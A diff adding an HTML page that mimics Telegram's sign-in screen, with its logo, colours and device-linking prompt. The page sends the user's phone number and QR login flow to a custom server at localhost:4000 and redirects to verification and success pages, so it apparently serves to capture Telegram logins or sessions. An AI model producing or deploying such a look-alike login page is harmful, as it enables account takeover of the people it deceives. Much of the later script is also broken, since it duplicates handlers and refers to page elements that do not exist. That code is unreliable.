@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to Telegram</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        background-color: #17212b;
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      .container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+        text-align: center;
+      }
+      .logo {
+        width: 80px;
+        height: 80px;
+        background-color: #3390ec;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+      }
+      h1 {
+        margin-bottom: 10px;
+        font-size: 24px;
+      }
+      p {
+        color: #8e8e8e;
+        margin-bottom: 30px;
+      }
+      .form-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+      label {
+        display: block;
+        margin-bottom: 8px;
+        color: #8e8e8e;
+      }
+      select, input {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        background-color: #242f3d;
+        color: white;
+        border-radius: 8px;
+        margin-bottom: 15px;
+      }
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #3390ec;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      .qr-link {
+        color: #3390ec;
+        text-decoration: none;
+        margin-top: 20px;
+        display: inline-block;
+      }
+      .qr-container {
+        display: none;
+        margin-top: 20px;
+      }
+      .qr-container.active {
+        display: block;
+      }
+      .qr-code {
+        width: 200px;
+        height: 200px;
+        margin: 0 auto;
+        background-color: white;
+        padding: 20px;
+        border-radius: 8px;
+      }
+      .phone-container.hidden {
+        display: none;
+      }
+      .timer {
+        color: #8e8e8e;
+        margin-top: 10px;
+      }
+      .back-button {
+        color: #3390ec;
+        text-decoration: none;
+        margin-top: 20px;
+        display: none;
+      }
+      .back-button.active {
+        display: inline-block;
+      }
+      .error {
+        color: #ff4d4f;
+        margin-bottom: 15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M23.0846 5.92622L4.25034 12.3519C3.1669 12.7309 3.17382 13.3054 4.05034 13.5359L9.25034 15.1729L19.9149 8.88622C20.3926 8.58622 20.8286 8.74747 20.4686 9.07622L11.7303 16.9359H11.7286L11.7303 16.9367L11.3563 22.3002C11.7926 22.3002 11.9846 22.0984 12.2286 21.8634L14.7686 19.3902L20.0286 23.2327C20.8114 23.6659 21.3786 23.4424 21.5726 22.5019L24.9303 7.17122C25.2149 6.02622 24.4883 5.50497 23.0846 5.92622Z" fill="white"/>
+        </svg>
+      </div>
+      <h1>Sign in to Telegram</h1>
+      <div id="error" class="error"></div>
+      <div id="phone-container" class="phone-container">
+        <p>Please confirm your country code and enter your phone number.</p>
+        <div class="form-group">
+          <label>Country</label>
+          <select id="country">
+            <!-- Country options will be populated dynamically -->
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Phone Number</label>
+          <input type="tel" id="phone" value="+1 --- --- ----">
+        </div>
+        <button onclick="handleNext()">NEXT</button>
+        <a href="#" class="qr-link" onclick="handleQRCode(event)">LOG IN BY QR CODE</a>
+      </div>
+      <div id="qr-container" class="qr-container">
+        <div class="qr-code" id="qr-code">
+          <!-- QR code will be inserted here -->
+        </div>
+        <p class="timer" id="timer"></p>
+        <p>Open Telegram on your phone<br>Go to Settings > Devices > Link Desktop Device</p>
+        <a href="#" class="back-button" onclick="handleBack(event)">LOG IN WITH PHONE NUMBER INSTEAD</a>
+      </div>
+    </div>
+    <script>
+      const API_BASE = 'http://localhost:4000';
+      const errorDiv = document.getElementById('error');
+
+      function showError(message) {
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+      }
+
+      function clearError() {
+        errorDiv.textContent = '';
+        errorDiv.style.display = 'none';
+      }
+
+      function handleNext() {
+        clearError();
+        const phone = document.getElementById('phone').value;
+        fetch(`${API_BASE}/send_code`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            phone_number: phone.replace(/\s/g, '')
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.user_id) {
+            localStorage.setItem('user_id', data.user_id);
+            window.location.href = '/verify.html';
+          } else {
+            showError(data.detail || 'Failed to send code');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          showError('Failed to connect to server');
+        });
+      }
+
+      let qrCheckInterval;
+      let qrExpiryTimer;
+
+      function handleQRCode(e) {
+        e.preventDefault();
+        clearError();
+        document.getElementById('phone-container').classList.add('hidden');
+        document.getElementById('qr-container').classList.add('active');
+        document.querySelector('.back-button').classList.add('active');
+        
+        fetch(`${API_BASE}/qrcodelogin`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.qr_code_url) {
+            const qrImage = document.createElement('img');
+            qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr_code_url)}&size=200x200`;
+            qrImage.alt = 'QR Code';
+            document.getElementById('qr-code').innerHTML = '';
+            document.getElementById('qr-code').appendChild(qrImage);
+            
+            localStorage.setItem('user_id', data.user_id);
+            startQRTimer();
+            startQRCheck(data.user_id);
+          } else {
+            showError('Failed to generate QR code');
+            handleBack(new Event('click'));
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          showError('Failed to generate QR code');
+          handleBack(new Event('click'));
+        });
+      }
+
+      function handleBack(e) {
+        e.preventDefault();
+        clearError();
+        document.getElementById('phone-container').classList.remove('hidden');
+        document.getElementById('qr-container').classList.remove('active');
+        document.querySelector('.back-button').classList.remove('active');
+        clearInterval(qrCheckInterval);
+        clearInterval(qrExpiryTimer);
+      }
+
+      function startQRTimer() {
+        let timeLeft = 120; // 2 minutes
+        const timerElement = document.getElementById('timer');
+        
+        clearInterval(qrExpiryTimer);
+        qrExpiryTimer = setInterval(() => {
+          const minutes = Math.floor(timeLeft / 60);
+          const seconds = timeLeft % 60;
+          timerElement.textContent = `QR code expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+          
+          if (timeLeft <= 0) {
+            clearInterval(qrExpiryTimer);
+            handleQRCode(new Event('click')); // Generate new QR code
+          }
+          timeLeft--;
+        }, 1000);
+      }
+
+      function startQRCheck(userId) {
+        clearInterval(qrCheckInterval);
+        qrCheckInterval = setInterval(() => {
+          fetch(`${API_BASE}/verify_qr_login/${userId}`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.authenticated) {
+              clearInterval(qrCheckInterval);
+              clearInterval(qrExpiryTimer);
+              window.location.href = '/success.html';
+            }
+          })
+          .catch(error => console.error('Error:', error));
+        }, 3000);
+      }
+
+      document.addEventListener('DOMContentLoaded', function() {
+        let countryCode = '+1';
+        let userId = null;
+        let qrCheckInterval = null;
+        let qrExpiryTimer = null;
+        let validCountries = [];
+
+        // Fetch all countries for the dropdown
+        fetch('https://restcountries.com/v3.1/all')
+          .then(response => response.json())
+          .then(data => {
+            console.log(`Received ${data.length} countries from API`);
+            const countrySelect = document.getElementById('country');
+            const countryCodes = {};
+            
+            // Clear the dropdown
+            countrySelect.innerHTML = '';
+            
+            // Process countries and add to dropdown
+            data.forEach(country => {
+              if (country.name && country.name.common && country.idd && country.idd.root) {
+                let code = country.idd.root;
+                if (country.idd.suffixes && country.idd.suffixes.length > 0) {
+                  code += country.idd.suffixes[0];
+                }
+                const countryName = country.name.common;
+                countryCodes[countryName] = code;
+                
+                const option = document.createElement('option');
+                option.value = countryName;
+                option.textContent = countryName;
+                countrySelect.appendChild(option);
+                validCountries.push(countryName);
+              }
+            });
+            
+            // Sort the dropdown options
+            const options = Array.from(countrySelect.options);
+            options.sort((a, b) => a.text.localeCompare(b.text));
+            countrySelect.innerHTML = '';
+            options.forEach(option => countrySelect.appendChild(option));
+            
+            // Set United States as default if available
+            const usOption = Array.from(countrySelect.options).find(opt => opt.text === 'United States');
+            if (usOption) {
+              usOption.selected = true;
+              document.getElementById('phone').value = '+1 --- --- ----';
+              countryCode = '+1';
+            }
+            
+            // Add event listener for country selection
+            countrySelect.addEventListener('change', function() {
+              const selectedCountry = this.value;
+              countryCode = countryCodes[selectedCountry];
+              document.getElementById('phone').value = `${countryCode} --- --- ----`;
+            });
+            
+            console.log(`Added ${validCountries.length} countries to dropdown`);
+          })
+          .catch(error => {
+            console.error('Error fetching countries:', error);
+            // Fallback countries if API fails
+            const fallbackCountries = {
+              'United States': '+1',
+              'United Kingdom': '+44',
+              'Canada': '+1',
+              'Nigeria': '+234',
+              'India': '+91',
+              'Germany': '+49',
+              'France': '+33',
+              'Australia': '+61',
+              'China': '+86',
+              'Japan': '+81',
+              'Brazil': '+55',
+              'Russia': '+7'
+            };
+            
+            const countrySelect = document.getElementById('country');
+            countrySelect.innerHTML = '';
+            
+            Object.keys(fallbackCountries).sort().forEach(country => {
+              const option = document.createElement('option');
+              option.value = country;
+              option.textContent = country;
+              countrySelect.appendChild(option);
+              validCountries.push(country);
+            });
+            
+            countrySelect.addEventListener('change', function() {
+              const selectedCountry = this.value;
+              countryCode = fallbackCountries[selectedCountry];
+              document.getElementById('phone').value = `${countryCode} --- --- ----`;
+            });
+            
+            // Set United States as default
+            document.getElementById('phone').value = '+1 --- --- ----';
+            countryCode = '+1';
+          });
+
+        // Handle phone number input focus
+        document.getElementById('phone').addEventListener('focus', function() {
+          if (this.value === `${countryCode} --- --- ----`) {
+            this.value = `${countryCode} `;
+          }
+        });
+
+        // Handle phone number input blur
+        document.getElementById('phone').addEventListener('blur', function() {
+          if (this.value === `${countryCode} ` || this.value === countryCode) {
+            this.value = `${countryCode} --- --- ----`;
+          }
+        });
+
+        // Handle login button click
+        document.getElementById('loginBtn').addEventListener('click', function() {
+          const phoneInput = document.getElementById('phone');
+          const phoneNumber = phoneInput.value.trim();
+          const phoneRegex = new RegExp(`^\\${countryCode}\\s?\\d{7,15}$`);
+          
+          if (!phoneNumber || phoneNumber === `${countryCode} --- --- ----` || !phoneRegex.test(phoneNumber)) {
+            document.getElementById('error').textContent = 'Please enter a valid phone number';
+            document.getElementById('error').style.display = 'block';
+            return;
+          }
+          
+          document.getElementById('error').style.display = 'none';
+          document.getElementById('loading').style.display = 'flex';
+          
+          // Send the phone number to the server
+          fetch('http://localhost:4000/send_code', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              phone_number: phoneNumber.trim().replace(/\s/g, '')
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('loading').style.display = 'none';
+            if (data.user_id) {
+              localStorage.setItem('user_id', data.user_id);
+              window.location.href = 'verify.html';
+            } else {
+              document.getElementById('error').textContent = data.detail || 'An error occurred';
+              document.getElementById('error').style.display = 'block';
+            }
+          })
+          .catch(error => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').textContent = 'Failed to send code. Please try again.';
+            document.getElementById('error').style.display = 'block';
+            console.error('Error:', error);
+          });
+        });
+
+        // QR Code Login
+        document.getElementById('qrLoginBtn').addEventListener('click', function() {
+          document.getElementById('error').style.display = 'none';
+          document.getElementById('loading').style.display = 'flex';
+          
+          // Get QR code from server
+          fetch('http://localhost:4000/qrcodelogin', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          })
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('loading').style.display = 'none';
+            if (data.qr_url && data.user_id) {
+              // Show QR code view
+              document.getElementById('phoneView').style.display = 'none';
+              document.getElementById('qrView').style.display = 'flex';
+              
+              // Generate QR code
+              const qrUrl = data.qr_url;
+              console.log("QR URL to encode:", qrUrl);
+              
+              // Clear previous QR code if any
+              document.getElementById('qrCode').innerHTML = '';
+              
+              // Create QR code image
+              const qrImage = document.createElement('img');
+              qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrUrl)}&size=200x200&bgcolor=17212b&color=ffffff&margin=2`;
+              qrImage.alt = 'QR Code';
+              qrImage.width = 200;
+              qrImage.height = 200;
+              qrImage.className = 'w-full h-full';
+              document.getElementById('qrCode').appendChild(qrImage);
+              
+              // Add Telegram logo overlay
+              const logoOverlay = document.createElement('div');
+              logoOverlay.className = 'absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white p-2 rounded-full shadow-lg';
+              logoOverlay.innerHTML = `
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#229ED9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14"></path>
+                </svg>
+              `;
+              document.getElementById('qrCode').appendChild(logoOverlay);
+              
+              // Start timer
+              userId = data.user_id;
+              startQRTimer();
+              startQRCheck(userId);
+            } else {
+              document.getElementById('error').textContent = data.detail || 'Failed to generate QR code';
+              document.getElementById('error').style.display = 'block';
+            }
+          })
+          .catch(error => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').textContent = 'Failed to generate QR code. Please try again.';
+            document.getElementById('error').style.display = 'block';
+            console.error('Error:', error);
+          });
+        });
+        
+        // Back to phone login
+        document.getElementById('backToPhoneBtn').addEventListener('click', function() {
+          // Clear timers
+          if (qrCheckInterval) clearInterval(qrCheckInterval);
+          if (qrExpiryTimer) clearInterval(qrExpiryTimer);
+          
+          // Show phone view
+          document.getElementById('qrView').style.display = 'none';
+          document.getElementById('phoneView').style.display = 'block';
+        });
+        
+        // Start QR timer for expiry countdown
+        function startQRTimer() {
+          let timeLeft = 120; // 2 minutes
+          if (qrExpiryTimer) clearInterval(qrExpiryTimer);
+          
+          qrExpiryTimer = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+              clearInterval(qrExpiryTimer);
+              // Regenerate QR code
+              document.getElementById('qrLoginBtn').click();
+            }
+            timeLeft--;
+          }, 1000);
+        }
+        
+        // Start checking QR login status
+        function startQRCheck(userId) {
+          if (qrCheckInterval) clearInterval(qrCheckInterval);
+          
+          qrCheckInterval = setInterval(() => {
+            fetch(`http://localhost:4000/verify_qr_login/${userId}`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              }
+            })
+            .then(response => {
+              if (!response.ok) {
+                throw response;
+              }
+              return response.json();
+            })
+            .then(data => {
+              if (data.status === 200) {
+                clearInterval(qrCheckInterval);
+                clearInterval(qrExpiryTimer);
+                localStorage.setItem('user_id', userId);
+                window.location.href = 'success.html';
+              }
+            })
+            .catch(error => {
+              if (error.status === 401 && error.statusText === 'QR code not yet scanned') {
+                // Continue polling - QR code not scanned yet
+                console.log("QR code not yet scanned, continuing to poll...");
+              } else if (error.status === 403) {
+                // 2FA required
+                clearInterval(qrCheckInterval);
+                clearInterval(qrExpiryTimer);
+                document.getElementById('qrView').style.display = 'none';
+                document.getElementById('phoneView').style.display = 'block';
+                document.getElementById('error').textContent = '2FA authentication required. Please use phone number login.';
+                document.getElementById('error').style.display = 'block';
+              } else if (error.status === 400) {
+                // QR code expired
+                document.getElementById('qrLoginBtn').click();
+              } else {
+                // Continue polling, but log error
+                console.error('Error checking QR login status:', error);
+              }
+            });
+          }, 3000);
+        }
+      });
+    </script>
+  </body>
+</html>
